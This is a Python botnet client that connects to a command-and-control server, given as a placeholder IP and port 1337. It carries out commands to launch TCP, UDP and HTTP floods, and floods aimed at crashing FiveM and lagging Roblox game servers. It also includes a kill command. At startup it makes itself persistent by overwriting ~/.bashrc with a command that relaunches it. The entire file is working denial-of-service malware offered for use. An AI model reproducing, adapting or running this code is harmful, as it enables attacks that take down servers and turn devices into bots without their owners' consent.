import socket
import threading
import time
import os
import requests
import random

C2_HOST ="YOUR_SERVER_IP"  # Replace with your IP
C2_PORT = 1337

def tcp_flood(target, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"\x00" * 1024)  # Junk data
            s.close()
        except:
            pass

def udp_flood(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(os.urandom(1024), (target, port))
        except:
            pass

def http_flood(target):
    while True:
        try:
            requests.get(target, headers={"User-Agent": f"Bot{random.randint(1, 500)}"})
        except:
            pass

def fivem_crash(target):
    # FiveM uses UDP, flood with garbage to crash
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(os.urandom(2048), (target, 30120))  # Default FiveM port
        except:
            pass

def roblox_lag(target):
    # Roblox uses UDP, overwhelm it
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(os.urandom(1500), (target, 49152))  # Common Roblox port range
        except:
            pass

def connect_to_c2():
    while True:
        try:
            bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bot.connect((C2_HOST, C2_PORT))
            bot.send(f"Bot {os.getpid()} locked and loaded".encode())
            return bot
        except:
            time.sleep(5)

def bot_main():
    bot = connect_to_c2()
    while True:
        try:
            command = bot.recv(1024).decode()
            if not command:
                break
            if command.startswith("tcpflood"):
                target, port = command.split()[1], int(command.split()[2])
                threading.Thread(target=tcp_flood, args=(target, port), daemon=True).start()
                bot.send("TCP flood unleashed".encode())
            elif command.startswith("udpflood"):
                target, port = command.split()[1], int(command.split()[2])
                threading.Thread(target=udp_flood, args=(target, port), daemon=True).start()
                bot.send("UDP flood unleashed".encode())
            elif command.startswith("httpflood"):
                target = command.split()[1]
                threading.Thread(target=http_flood, args=(target,), daemon=True).start()
                bot.send("HTTP flood unleashed".encode())
            elif command.startswith("fivemcrash"):
                target = command.split()[1]
                threading.Thread(target=fivem_crash, args=(target,), daemon=True).start()
                bot.send("FiveM crash unleashed".encode())
            elif command.startswith("robloxlag"):
                target = command.split()[1]
                threading.Thread(target=roblox_lag, args=(target,), daemon=True).start()
                bot.send("Roblox lag unleashed".encode())
            elif command =="kill":
                bot.send("Bot self-destructing".encode())
                bot.close()
                os._exit(0)
        except:
            bot.close()
            bot = connect_to_c2()

if __name__ == "__main__":
    os.system("echo 'python /data/data/com.termux/files/home/bot_client.py &' > ~/.bashrc")
    bot_main()
